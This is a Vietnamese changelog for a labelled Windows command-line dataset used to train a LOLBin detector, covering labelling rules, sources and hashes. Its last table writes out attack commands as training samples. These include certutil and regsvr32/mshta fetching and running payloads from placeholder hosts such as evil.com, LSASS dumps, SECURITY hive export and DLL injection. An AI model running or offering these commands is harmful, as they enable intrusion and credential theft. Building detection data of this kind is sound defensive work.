- Bổ sung riêng Nhóm J trong rules_constants.py: win_msiexec_disguised_web_package, win_odbcconf_remote_registration, win_schtasks_remote_scriptlet, win_bash_socat_shell. Các rule chỉ sinh feature; không tự ép BAD.
- Có đối chứng âm: MSI hợp lệ qua HTTP, URL logo.png nằm ở property khác, ODBC DLL hệ thống, task Notepad và Bash echo/Socat truyền dữ liệu không chạy shell.
- Sau bổ sung không có nhóm vector giống hệt nhau nhưng trái nhãn trong tập này. Điều này không tương đương F1 tốt hơn hoặc bảo đảm không báo nhầm.
- Windows feature version v17; Linux vẫn v13. Không đổi threshold, RF, split, corpus BLEU hay model trong đợt này. Cần train lại Windows trước khi scan/evaluate. train.csv và số đo README đang thuộc lần train cũ.
- Hai CSV giữ schema cũ: windows_7 là lable,command; raw/windows là commands,label. Có backup nguyên byte trước khi thay.
- Nguồn và family từng record: D:/APT/windows-good-only-review-20261110/provenance.jsonl. sources.json giữ hash các tài liệu đã đọc và workbook nguồn.
- SHA-256 windows_7: `6aa9a88e50b249fd918138768403f09943fd76f0544d806f2954d4452c01a446`.
- SHA-256 raw: `359741be6a5bee3dcd5ba9932fb6826d67083198c651f2d3dd17a5be5c5d0c54`.

#### Lịch sử — bản 3.120 lệnh

Số lượng và record trong phần lịch sử dưới đây không phải số record của bản hiện tại.

#### Windows 7 — bổ sung đối chứng GOOD

Hiện có **3120 lệnh**: **2753 GOOD**, **367 BAD/Abuse/Suspicious**.

Bổ sung **28 GOOD** cho **15/17** công cụ trước đây chỉ có BAD. Số nhóm có cả hai lớp tăng **39 → 54**; còn **2** nhóm chưa có GOOD phù hợp.

##### Căn cứ gán GOOD

- Giữ nguyên mọi lệnh/nhãn cũ và toàn bộ BAD. Chỉ thêm các điều khiển bình thường có nguồn đã đọc, không tự đổi BAD thành GOOD.
- CSE GOOD được chọn theo record gốc: giao diện trợ giúp HP/Agilent, wizard triển khai và một script tạo shortcut có nội dung hiển thị đầy đủ. Không giữ mẫu wildcard hỏng, script từ Temp chưa rõ nội dung hoặc câu có hành vi tải/chạy mã.
- Diantz và Extrac32: ba mẫu được điền từ cú pháp Microsoft, với nguồn/đích chẩn đoán minh họa. Đây là fixture tổng hợp theo cú pháp, không phải quan sát thực tế hoặc lệnh nguyên văn từ dataset.
- PubPrn: kết hợp đường dẫn script được Microsoft mô tả với ví dụ LDAP, ghi rõ sửa hậu tố .vbs; không bịa tham số hoặc dùng script: URL làm GOOD.
- Mavinject: chỉ thêm chế độ App-V mặc định, không truyền custom DLL. GOOD này có điều kiện: registry Modules/Modules64 đúng và ứng dụng đích được phép. Nếu registry bị sửa, chính câu lệnh đó có thể bị lợi dụng; một dòng không đủ xác minh trạng thái hệ thống.
- Pcwrun: đối chứng tổng hợp dùng Notepad hệ thống làm đầu vào cho chức năng tương thích được mô tả; không coi mọi EXE tùy ý là GOOD. Không giả đây là một quan sát benign có nhãn từ nguồn.
- Các mẫu ADPlus, MSDT, WMP, Regini có thể thuộc Windows/phần mềm cũ; điều kiện phiên bản và sản phẩm được giữ trong provenance. Không khẳng định chúng chạy được trên mọi Windows hiện tại.

##### Bao phủ sau bổ sung

| Công cụ | GOOD | BAD |
| --- | ---: | ---: |
| adplus | 2 | 5 |
| diantz | 1 | 4 |
| extrac32 | 2 | 5 |
| fltmc | 2 | 1 |
| mavinject | 1 | 10 |
| msdt | 3 | 1 |
| msedge_proxy | 2 | 1 |
| mshta | 4 | 20 |
| msxsl | 1 | 3 |
| ntdsutil | 2 | 2 |
| pcwrun | 1 | 1 |
| pubprn.vbs | 2 | 7 |
| regini | 1 | 5 |
| scp | 2 | 4 |
| unregmp2 | 2 | 1 |

##### Hai nhóm còn thiếu

- mscopilot và mscopilot_proxy: nguồn xác nhận đây là binary có thật và mô tả abuse, nhưng chưa có process CLI GOOD đủ căn cứ trong nguồn đã kiểm tra. Các ví dụ URI ms-copilot: không được đổi tên thành dòng lệnh .exe để làm tăng số nhóm có đối chứng.
- Không thêm mẫu bare executable/--help không có nguồn hoặc chỉ xóa tham số tấn công rồi tự gán 0. Cần thu thập process creation hợp lệ của ứng dụng và xác minh nguồn trước khi bổ sung.

##### Feature và định dạng dữ liệu

- Cscript/Wscript nhận diện script .vbs/.js/... ở vị trí thực thi đầu tiên, sau các cờ //nologo, //E:...; không coi tham số dữ liệu phía sau là executable. PubPrn qua Cscript và gọi trực tiếp cùng có feature COMMAND_PUBPRN.VBS.
- Bổ sung feature custom DLL của Mavinject, nạp/gỡ minifilter bảo vệ, IFM export của NTDSUTIL và traversal + expression của MSDT/PCWRUN. Không dùng tên công cụ để ép BAD; các nhãn chỉ là đầu vào ML.
- Sau kiểm tra toàn bộ tập còn 0 nhóm vector giống nhau nhưng trái nhãn. Đây là kiểm tra biểu diễn, không phải kết quả false positive/false negative thực tế.
- Windows feature version v16; Linux vẫn v13. Chưa train lại model. Muốn đánh giá cần chia theo family/mẫu gốc, giữ dữ liệu ngoài tập để kiểm định; không dùng test để chọn nhãn.
- windows_7.csv giữ lable,command; raw/windows.csv được đồng bộ thành commands,label. Raw được backup nguyên byte trước khi thay. Không chạy bất kỳ lệnh dataset nào.

##### Từng mẫu mới và nguồn

| Record mới | Công cụ | Loại nguồn | Lệnh | Lý do / điều kiện | Nguồn |
| ---: | --- | --- | --- | --- | --- |
| 1178 | mshta | source_GOOD_dataset | <code>mshta  VBScript:Execute(&quot;Set a=CreateObject(&quot;&quot;WScript.Shell&quot;&quot;):Set b=a.CreateShortcut(a.SpecialFolders(&quot;&quot;DeskTop&quot;&quot;) &amp; &quot;&quot;\GSF.LNK&quot;&quot;):b.TargetPath=&quot;&quot;D:\Inspur\TJGJT_CSHJ2_PROD\GSFramework.exe&quot;&quot;:b.WorkingDirectory=&quot;&quot;D:\Inspur\TJGJT_CSHJ2_PROD\&quot;&quot;:b.Arguments=&quot;&quot;&quot;&quot;:b.Save:close&quot;)</code> | Sourced application/deployment UI or explicit desktop shortcut creation; no remote scriptlet or ADS. Label 0 from CSE, manually screened; not independent incident ground truth. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1176 | mshta | source_GOOD_dataset | <code>C:\Windows\System32\mshta.exe &quot;C:\ProgramData\HP\HP LaserJet MFP M227-M231 Help\Help\jam_in_printer_tray1.hta&quot;</code> | Sourced application/deployment UI or explicit desktop shortcut creation; no remote scriptlet or ADS. Label 0 from CSE, manually screened; not independent incident ground truth. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1177 | mshta | source_GOOD_dataset | <code>MSHTA.exe &quot;E:\Deploy\Scripts\Wizard.hta&quot; /definition:BDD_Welcome_ENU.xml</code> | Sourced application/deployment UI or explicit desktop shortcut creation; no remote scriptlet or ADS. Label 0 from CSE, manually screened; not independent incident ground truth. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1175 | mshta | source_GOOD_dataset | <code>mshta &quot;C:\Program Files (x86)\Agilent\IO Libraries Suite\Success\Success.hta&quot;</code> | Sourced application/deployment UI or explicit desktop shortcut creation; no remote scriptlet or ADS. Label 0 from CSE, manually screened; not independent incident ground truth. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1466 | msxsl | official_example | <code>c:\bat\msxsl mydata.xml mytransform.xsl -o myoutput.html</code> | Local XML-to-HTML presentation transform. Input stylesheet is the documented presentation stylesheet, not attacker-controlled script. | [nguồn](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms754529(v=vs.85)) |
| 7 | adplus | vendor_example | <code>adplus -crash -pn saplogon.exe -quiet -o c:\temp</code> | Troubleshoot SAP GUI crashes by named application, not credential-process capture. Authorized SAP GUI troubleshooting with ADPlus installed; historical vendor example, not guaranteed on every Windows version. | [nguồn](https://help.sap.com/docs/SUPPORT_CONTENT/nwtech/3362694049.html) |
| 6 | adplus | vendor_example | <code>adplus -crash -pn saplgpad.exe -quiet -o c:\temp</code> | Troubleshoot SAP GUI crashes by named application, not credential-process capture. Authorized SAP GUI troubleshooting with ADPlus installed; historical vendor example, not guaranteed on every Windows version. | [nguồn](https://help.sap.com/docs/SUPPORT_CONTENT/nwtech/3362694049.html) |
| 391 | diantz | official_syntax_instantiation | <code>diantz C:\Support\diagnostics.log C:\Support\diagnostics.cab</code> | Compress a local diagnostic log into a local CAB; no ADS or remote source. Illustrative resource names, not an observed command. | [nguồn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diantz) |
| 485 | extrac32 | official_syntax_instantiation | <code>Extrac32 /E /L C:\Support\Extract C:\Support\diagnostics.cab</code> | Extract an authorized local support CAB, no ADS, remote copy or execution. Known benign support archive; illustrative paths, not an observed command. | [nguồn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/extract) |
| 484 | extrac32 | official_syntax_instantiation | <code>Extrac32 /D C:\Support\diagnostics.cab</code> | Inspect a local CAB directory without extraction or execution. Illustrative paths, not an observed command. | [nguồn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/extract) |
| 2639 | regini | vendor_instruction_as_cli | <code>REGINI.EXE EDR.INI</code> | Install Eagle Technology board-driver registry configuration from the vendor SDK. EDR means Eagle device SDK, not an endpoint-security product. Historical Windows NT installation context; original vendor file required. | [nguồn](https://www.egmont.com.pl/eagle/instrukcje/edr_manual.pdf) |
| 2404 | pubprn.vbs | official_example_syntax_repair | <code>cscript %WINdir%\System32\printing_Admin_Scripts\en-US\pubprn.vbs Server1 LDAP://CN=MyContainer,DC=MyDomain,DC=company,DC=Com</code> | Publish printers to Active Directory using LDAP, not a script: moniker. Use documented script directory and explicit .vbs suffix; no host/container values invented. | [nguồn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn) |
| 2405 | pubprn.vbs | official_example_syntax_repair | <code>cscript %WINdir%\System32\printing_Admin_Scripts\en-US\pubprn.vbs \\Server1\Laserprinter1 LDAP://CN=MyContainer,DC=MyDomain,DC=company,DC=Com</code> | Publish printers to Active Directory using LDAP, not a script: moniker. Use documented script directory and explicit .vbs suffix; no host/container values invented. | [nguồn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn) |
| 1982 | ntdsutil | official_example | <code>ntdsutil files integrity</code> | Check Active Directory database integrity, not IFM export of credential data. Run in documented Directory Services Restore Mode; this dataset does not run the command. | [nguồn](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/0xc00002e1-error-start-domain-controller) |
| 1981 | ntdsutil | official_example | <code>ntdsutil &quot;sem d a&quot; go</code> | Read-only semantic database analysis, without repair or export. Requires the documented AD recovery environment. | [nguồn](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/0xc00002e1-error-start-domain-controller) |
| 523 | fltmc | vendor_example | <code>fltmc load SWFsv2Fltr</code> | Load the installed vendor protection minifilter; differs from unloading SysmonDrv. Driver supplied by the vendor, signed and already installed; command text alone does not verify file integrity. | [nguồn](https://documentation.solarwinds.com/en/success_center/scm/content/scm-fim-driver-not-working-properly.htm) |
| 524 | fltmc | vendor_example | <code>fltmc load vsepflt</code> | Load the installed vendor protection minifilter; differs from unloading SysmonDrv. Driver supplied by the vendor, signed and already installed; command text alone does not verify file integrity. | [nguồn](https://success.trendmicro.com/en-US/solution/KA-0010085) |
| 2887 | scp | official_example | <code>scp file azureuser@azurehost:directory/targetfile</code> | Ordinary authenticated file transfer; no custom PKCS11 library or ProxyCommand. Authorized transfer. File contents and destination ownership cannot be proved from CLI alone. | [nguồn](https://learn.microsoft.com/en-us/azure/virtual-machines/copy-files-to-vm-using-scp) |
| 2886 | scp | official_example | <code>scp azureuser@azurehost:directory/file targetfile</code> | Ordinary authenticated file transfer; no custom PKCS11 library or ProxyCommand. Authorized transfer. File contents and destination ownership cannot be proved from CLI alone. | [nguồn](https://learn.microsoft.com/en-us/azure/virtual-machines/copy-files-to-vm-using-scp) |
| 2926 | unregmp2 | vendor_support_reply | <code>UNREGMP2.EXE /UPDATEWMPVERSION</code> | Repair Windows Media Player version registration, without ProgramW6432 override or substituted wmpnscfg.exe. Historical Windows Vista/7 support instructions by Microsoft Support. | [nguồn](https://learn.microsoft.com/en-us/answers/questions/2446793/windows-media-player-12-wmplayer-exe-wrong-version) |
| 2925 | unregmp2 | vendor_support_reply | <code>UNREGMP2.EXE /UPDATEWMP</code> | Repair Windows Media Player version registration, without ProgramW6432 override or substituted wmpnscfg.exe. Historical Windows Vista/7 support instructions by Microsoft Support. | [nguồn](https://learn.microsoft.com/en-us/answers/questions/2446793/windows-media-player-12-wmplayer-exe-wrong-version) |
| 1079 | msdt | firsthand_support_example | <code>msdt.exe -id DeviceDiagnostic</code> | Run a built-in troubleshooting pack; no traversal, substitution or Follina answer-file injection. Historical MSDT-enabled Windows only; tool is retired on newer systems. Microsoft Q&amp;A example, cross-checked with official MSDT pack list. | [nguồn](https://learn.microsoft.com/en-us/answers/questions/751947/everything-wifi-related-is-gone) |
| 1080 | msdt | firsthand_support_example | <code>msdt.exe -id NetworkDiagnosticsNetworkAdapter</code> | Run a built-in troubleshooting pack; no traversal, substitution or Follina answer-file injection. Historical MSDT-enabled Windows only; tool is retired on newer systems. Microsoft Q&amp;A example, cross-checked with official MSDT pack list. | [nguồn](https://learn.microsoft.com/en-us/answers/questions/751947/everything-wifi-related-is-gone) |
| 1081 | msdt | firsthand_support_example | <code>msdt.exe -id WindowsUpdateDiagnostic</code> | Run a built-in troubleshooting pack; no traversal, substitution or Follina answer-file injection. Historical MSDT-enabled Windows only; tool is retired on newer systems. Microsoft Q&amp;A example, cross-checked with official MSDT pack list. | [nguồn](https://learn.microsoft.com/en-us/answers/questions/751947/everything-wifi-related-is-gone) |
| 1129 | msedge_proxy | firsthand_normal_usage | <code>&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe&quot; --profile-directory=Default --app-id=fmgjjmmmlfnkbppncabfkddbjimcfncm --app-url=https://mail.google.com/mail/?usp=installed_webapp --app-run-on-os-login-mode=windowed</code> | Launch installed Gmail PWA with a selected Edge profile, not a GPU shell launcher. Direct user-reported installed-app shortcut; not a Microsoft product specification. Removed display escaping only. | [nguồn](https://techcommunity.microsoft.com/discussions/edgeinsiderdiscussions/msedge-proxy-exe-and-install-this-site-as-an-app/3441554) |
| 1128 | msedge_proxy | firsthand_normal_usage | <code>&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe&quot; --profile-directory=&quot;Profile 1&quot; --app-id=fmgjjmmmlfnkbppncabfkddbjimcfncm --app-url=https://mail.google.com/mail/?usp=installed_webapp --app-run-on-os-login-mode=windowed</code> | Launch installed Gmail PWA with a selected Edge profile, not a GPU shell launcher. Direct user-reported installed-app shortcut; not a Microsoft product specification. Removed display escaping only. | [nguồn](https://techcommunity.microsoft.com/discussions/edgeinsiderdiscussions/msedge-proxy-exe-and-install-this-site-as-an-app/3441554) |
| 1049 | mavinject | normal_mode_template_instantiation | <code>mavinject 4321 /INJECTRUNNING</code> | Default App-V subsystem injection without an explicit custom DLL argument. Conditional GOOD: trusted normal App-V registry Modules/Modules64 values and an authorized application target. PID 4321 is illustrative. A compromised registry could change the behavior of the same command. | [nguồn](https://fourcore.io/blogs/mavinject-curious-process-injection) |
| 1989 | pcwrun | documented_function_benign_fixture | <code>Pcwrun.exe C:\Windows\System32\notepad.exe</code> | Compatibility-wizard invocation with a declared benign Notepad fixture; no traversal or expression injection. This is a constructed normal-use control, NOT a source-labeled GOOD observation. Assumes genuine System32 Notepad; arbitrary unknown executables are not automatically GOOD. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pcwrun.yml) |

##### Nhật ký và nguồn dữ liệu

- D:/APT/windows-good-counterparts-20261109/provenance.jsonl giữ nguồn, điều kiện nhãn và family cho toàn bộ tập sau bổ sung. sources.json ghi trạng thái tải/hash; bản Microsoft Community được kiểm chứng từ nội dung công khai đã đọc, request lưu HTML trả 403 nên không được thử lại hay gán hash giả.
- SHA-256 windows_7: `8b98f245bd68b98c1d1d065259b6739f22f1070131f415b02ce55b4ad0624b81`.
- SHA-256 raw mới: `478d3e3878a361884036f7916fea8f0c22fbeeb936fe6768dff358e1882166ec`.

##### Nhật ký đợt trước — bản 3092 lệnh, số record lịch sử

Phần dưới là lịch sử, không phải số lượng hoặc số record của bản hiện tại.

##### Windows 7: tập ứng viên đã rà soát

Hiện có **3092 lệnh**: **2725 GOOD**, **367 BAD/Abuse/Suspicious**.

###### Bổ sung sau đối chiếu raw

- Thêm 150 BAD và 1 GOOD đối chứng; đưa 5 mẫu cũ ra ngoài gồm generic launcher trái nhãn và ProcDump chỉ có PID chưa rõ target. Không tự đổi nhãn các mẫu giữ lại.
- Đọc toàn bộ 690 BAD trong raw, các mẫu LOLBAS ban đầu và các test CMD phù hợp của Atomic Red Team. Chỉ giữ hành vi đã được duyệt, không nhập lại mọi nhãn nguồn 1.
- Những dòng không có nguồn nguyên văn trong raw được ghi đúng là mẫu kế thừa; căn cứ giữ là cơ chế cụ thể đối chiếu LOLBAS/Atomic. Không coi chúng là quan sát tấn công độc lập đã xác minh.
- Giữ tập GOOD nền, không ép tỷ lệ 1:1, không sinh hàng trăm biến thể IP/path. Chỉ template nguồn có kiểu tài nguyên được điền tối đa 3 trường hợp khác feature; không sinh body DLL/script hoặc payload mã hóa.
- Không phục hồi các payload đã bị Defender chặn; không chạy bất kỳ lệnh nào trong dataset. Các đường dẫn/địa chỉ trong mẫu chỉ được xử lý như chuỗi.

###### Phạm vi nhãn

- 1 mô tả malicious/abuse/suspicious hoặc PoC có cơ chế cụ thể. Không đồng nhất với ý đồ tấn công đã được chứng minh. Ví dụ xóa log, export hive hoặc chèn DLL vẫn có thể thuộc bảo trì có ủy quyền.
- Chỉ tên file evil/payload, một URL tải file, process create chung, DLL/INF/MSI chưa rõ nội dung hoặc discovery không đủ để gán 1.
- Generic ShellExec_RunDLL mở chương trình bị đưa ra ngoài cả hai lớp khi chỉ dựa vào calc/echo; không dùng tên ứng dụng để tạo khác biệt giả.
- ProcDump chỉ có PID không được tự coi là GOOD khi chưa biết PID trỏ vào tiến trình nào. Xóa khỏi CSV không tự bảo đảm model trả NEUTRAL; dữ liệu vận hành cần process name/context để xử lý trường hợp này.
- Bất đồng raw↔7: wevtutil cl Application/System giữ 1 theo chính sách thao tác audit nhạy cảm; BITS tải bộ cài đơn thuần và certutil decodehex TXT→TXT không được nhập như BAD. Các mẫu GOOD hiện có không bị đổi thành BAD theo nhãn raw.
- Export HKLM\SYSTEM\CurrentControlSet\Services là cấu hình service, không được nhầm với lấy toàn bộ hive SYSTEM. Đã thu hẹp feature hive và bổ sung kiểm tra ranh giới.

###### Feature và huấn luyện

- Bổ sung 7 rule cho CMD đọc/ghi ADS, ProcDump/ADPlus nhắm LSASS, Wuauclt custom provider, BITS callback, certutil giải mã ra mã thực thi/web, RegisterOCX→EXE và PKCS11 UNC. ADS nhận cả đường dẫn tương đối/biến môi trường; không xóa stream khi so sánh.
- Giữ nguyên các khác biệt flags, API export, ADS và target credential. Không dùng near_key cũ vốn có thể nuốt ADS để khử trùng. Chỉ khử trùng khóa lệnh giữ case tham số; các nguồn trùng được lưu riêng.
- Còn 0 nhóm cùng vector nhưng khác nhãn trong bản xem trước. Việc cùng vector không dùng để quyết định nhãn; các nhóm nếu còn cần sửa feature hoặc xem lại ngữ nghĩa.
- Windows feature version là v15; Linux giữ nguyên. Model Windows cũ cần train lại, không sửa metadata để giả tương thích. Chưa thay raw/windows.csv hoặc model trong lần này.
- CLI hiện đọc data/raw/windows.csv với cột commands,label; windows_7 vẫn là lable,command theo các bản trước. Chưa tự đưa bản ứng viên này vào train.
- Phải chia theo mẫu gốc/nhóm hành vi trước augment. Provenance có family; không chia các biến thể cùng mẫu vào cả train và test. class_weight=balanced đã có trong trainer; tăng số bản sao không thay thế dữ liệu độc lập.
- Chưa có bằng chứng về mức false positive/false negative ngoài thực tế. Cần kiểm định trên lệnh vận hành có nguồn và dữ liệu ngoài tập đã rà soát; không chọn nhãn theo F1 test.

###### Các lệnh được thêm

| Record mới | Nhãn | Nguồn / record | Cơ chế | Lệnh |
| ---: | ---: | --- | --- | --- |
| 336 | 1 | raw / 402 | alternate_data_stream | <code>control.exe c:\windows\tasks\file.txt:evil.dll</code> |
| 346 | 1 | raw / 403 | alternate_data_stream | <code>cscript c:\ads\file.txt:script.vbs</code> |
| 388 | 1 | raw / 408 | alternate_data_stream | <code>diantz.exe c:\pathToFile\file.exe c:\destinationFolder\targetFile.txt:targetFile.cab</code> |
| 396 | 1 | raw / 412 | dns_plugin_execution | <code>dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll</code> |
| 398 | 1 | raw / 413 | dns_plugin_execution | <code>dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\193.168.0.149\dll\wtf.dll</code> |
| 393 | 1 | raw / 414 | dns_plugin_execution | <code>dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \\193.168.0.149\dll\wtf.dll</code> |
| 471 | 1 | raw / 420 | alternate_data_stream | <code>expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat</code> |
| 467 | 1 | raw / 421 | alternate_data_stream | <code>expand \\11.12.13.14\folder\file.bat c:\ADS\file.txt:file.bat</code> |
| 465 | 1 | raw / 422 | alternate_data_stream | <code>expand \\10.10.10.10\folder\file.bat c:\ADS\file.txt:file.bat</code> |
| 476 | 1 | raw / 424 | alternate_data_stream | <code>extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe</code> |
| 483 | 1 | raw / 426 | alternate_data_stream | <code>findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe &gt; c:\ADS\file.txt:file.exe</code> |
| 1026 | 1 | raw / 440 | alternate_data_stream | <code>makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab</code> |
| 1036 | 1 | raw / 443 | dll_injection | <code>MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll</code> |
| 1037 | 1 | raw / 444 | alternate_data_stream | <code>Mavinject.exe 4172 /INJECTRUNNING &quot;c:\ads\file.txt:file.dll&quot;</code> |
| 1047 | 1 | raw / 445 | alternate_data_stream | <code>MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\nicefile.txt:evil.exe</code> |
| 1146 | 1 | raw / 447 | alternate_data_stream | <code>mshta.exe &quot;C:\ads\file.txt:file.hta&quot;</code> |
| 2604 | 1 | raw / 452 | alternate_data_stream | <code>regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey</code> |
| 2615 | 1 | raw / 453 | alternate_data_stream | <code>regini.exe newfile.txt:hidden.ini</code> |
| 3025 | 1 | raw / 464 | alternate_data_stream | <code>wscript c:\ads\file.txt:script.vbs</code> |
| 5 | 1 | raw / 469 | credential_process_dump | <code>adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet</code> |
| 2382 | 1 | raw / 503 | scriptlet_proxy_execution | <code>pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct</code> |
| 2377 | 1 | raw / 504 | scriptlet_proxy_execution | <code>pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct</code> |
| 2379 | 1 | raw / 505 | scriptlet_proxy_execution | <code>pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct</code> |
| 2621 | 1 | raw / 517 | scriptlet_proxy_execution | <code>regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll</code> |
| 2617 | 1 | raw / 518 | scriptlet_proxy_execution | <code>regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll</code> |
| 2616 | 1 | raw / 519 | scriptlet_proxy_execution | <code>regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll</code> |
| 2350 | 1 | raw / 530 | credential_process_dump | <code>.\procdump.exe -r -ma lsass.exe lsass.dmp</code> |
| 2499 | 1 | raw / 531 | credential_registry_export | <code>reg.exe save hklm\security c:\users\public\downloads\security.save</code> |
| 1156 | 1 | raw / 541 | scriptlet_proxy_execution | <code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code> |
| 1152 | 1 | raw / 542 | scriptlet_proxy_execution | <code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://10.10.10.10/payload.sct&quot;&quot;)&quot;))</code> |
| 1154 | 1 | raw / 543 | scriptlet_proxy_execution | <code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://11.11.11.11/payload.sct&quot;&quot;)&quot;))</code> |
| 2983 | 1 | raw / 556 | remote_stylesheet_execution | <code>wmic os get /format:&quot;https://webserver/payload.xsl&quot;</code> |
| 2980 | 1 | raw / 557 | remote_stylesheet_execution | <code>wmic os get /format:&quot;https://10.10.10.10/payload.xsl&quot;</code> |
| 2981 | 1 | raw / 558 | remote_stylesheet_execution | <code>wmic os get /format:&quot;https://11.11.11.11/payload.xsl&quot;</code> |
| 2634 | 1 | raw / 565 | scriptlet_proxy_execution | <code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code> |
| 2632 | 1 | raw / 566 | scriptlet_proxy_execution | <code>regsvr32 /u /n /s /i:http://10.10.10.10/payload.sct scrobj.dll</code> |
| 2633 | 1 | raw / 567 | scriptlet_proxy_execution | <code>regsvr32 /u /n /s /i:http://11.11.11.11/payload.sct scrobj.dll</code> |
| 159 | 1 | raw / 574 | decode_executable_or_web_code | <code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll</code> |
| 154 | 1 | raw / 575 | decode_executable_or_web_code | <code>certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll</code> |
| 156 | 1 | raw / 576 | decode_executable_or_web_code | <code>certutil -urlcache -split -f http://11.11.11.11/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll</code> |
| 160 | 1 | raw / 577 | decode_executable_or_web_code | <code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</code> |
| 155 | 1 | raw / 578 | decode_executable_or_web_code | <code>certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</code> |
| 157 | 1 | raw / 579 | decode_executable_or_web_code | <code>certutil -urlcache -split -f http://11.11.11.11/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</code> |
| 150 | 1 | raw / 597 | alternate_data_stream | <code>certutil.exe -urlcache -f http://evil.com/script_13.ps1 C:\Users\Public\Libraries\build_14:ttt</code> |
| 214 | 1 | raw / 601 | alternate_data_stream | <code>cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:http://attacker.com/build_16.sct ^scrobj.dll &gt; C:\Windows\Temp\test_17:payload.bat</code> |
| 333 | 1 | raw / 612 | alternate_data_stream | <code>control.exe C:\Projects\payload_30:evil.dll</code> |
| 343 | 1 | raw / 614 | alternate_data_stream | <code>cscript //e:vbscript C:\Windows\Temp\payload_32:script.vbs</code> |
| 397 | 1 | raw / 623 | dns_plugin_execution | <code>dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.1.50\share\job_43.dll</code> |
| 453 | 1 | raw / 624 | alternate_data_stream | <code>esentutl.exe /y C:\ProgramData\test_44.exe /d C:\Windows\System32\Tasks\job_45:file.exe /o</code> |
| 454 | 1 | raw / 625 | alternate_data_stream | <code>esentutl.exe /y C:\Users\Public\Libraries\build_46:file.exe /d C:\Windows\Temp\evil_47.exe /o</code> |
| 469 | 1 | raw / 630 | alternate_data_stream | <code>expand \\172.16.0.5\share\data_54.bat C:\Windows\Temp\evil_55:file.bat</code> |
| 486 | 1 | raw / 636 | alternate_data_stream | <code>findstr /V /L W3AllLov3LolBas C:\Users\Public\Libraries\build_62.exe &gt; C:\Windows\Temp\evil_63:file.exe</code> |
| 491 | 1 | raw / 637 | alternate_data_stream | <code>findstr /V /L W3AllLov3LolBas \\172.16.0.5\share\data_64.exe &gt; C:\Windows\Temp\test_65:file.exe</code> |
| 1019 | 1 | raw / 659 | alternate_data_stream | <code>makecab C:\Users\Public\Downloads\payload_83.exe C:\ProgramData\test_84:autoruns.cab</code> |
| 1022 | 1 | raw / 660 | alternate_data_stream | <code>makecab \\10.10.10.10\share\payload_85.exe C:\Users\Public\Libraries\build_86:file.cab</code> |
| 1033 | 1 | raw / 663 | dll_injection | <code>MavInject.exe 3110 /INJECTRUNNING C:\Projects\payload_90.dll</code> |
